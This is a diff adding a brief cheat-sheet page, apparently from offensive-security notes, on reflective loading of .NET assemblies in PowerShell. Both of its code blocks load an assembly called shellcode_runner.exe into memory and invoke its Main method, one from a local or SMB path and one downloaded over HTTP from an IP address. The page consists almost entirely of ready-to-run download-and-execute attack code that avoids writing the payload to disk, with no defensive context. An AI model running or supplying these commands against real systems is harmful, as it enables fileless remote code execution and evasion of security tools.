@@ -1,0 +1,20 @@
+---
+title: "Execute via Reflection"
+description: "Reflective loading of .NET assemblies."
+---
+
+## Local or SMB
+
+```powershell
+$data=[IO.File]::ReadAllBytes('shellcode_runner.exe')
+$ass=[System.Reflection.Assembly]::Load($data)
+$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))
+```
+
+## Remote (HTTP)
+
+```powershell
+$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe')
+$ass=[System.Reflection.Assembly]::Load($data)
+$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))
+```
